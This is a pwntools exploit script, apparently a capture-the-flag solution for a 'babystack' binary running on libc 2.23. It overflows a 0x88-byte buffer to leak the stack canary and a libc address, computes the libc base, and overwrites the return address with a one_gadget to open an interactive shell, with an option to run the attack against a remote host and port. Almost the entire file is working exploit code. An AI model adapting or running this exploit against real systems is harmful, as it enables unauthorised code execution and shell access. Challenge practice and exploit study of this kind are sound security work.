from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x4009d8
b* 0x400a2a
continue
'''.format(**locals())

#Binary filename
exe = './babystack_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc-2.23.so")

junk = b"a" * 0x88


p.sendlineafter(b">> ", "1")
p.send(junk + b"a")
p.sendlineafter(b">> ", "2")
binary = u64(b"\x00" + p.recvuntil(b"\n")[-9:-2])
log.info("binary = " + hex(binary))

p.sendlineafter(b">> ", "1")
p.send(junk + b"a" * 17)
p.sendlineafter(b">> ", "2")
leak_libc = u64((b"\x30"+ p.recvuntil(b"\n")[-6:-1]).ljust(8, b"\x00"))
log.info("libc  = " + hex(leak_libc))
libc.address = leak_libc - 0x20830
log.info("libc base = " + hex(libc.address))

one_gadget = libc.address + 0x4526a

p.sendlineafter(b">> ", "1")
p.send(junk + p64(binary) + p64(0) + p64(one_gadget) + p64(0) * 10)

p.sendlineafter(b">> ", "3")

p.interactive()
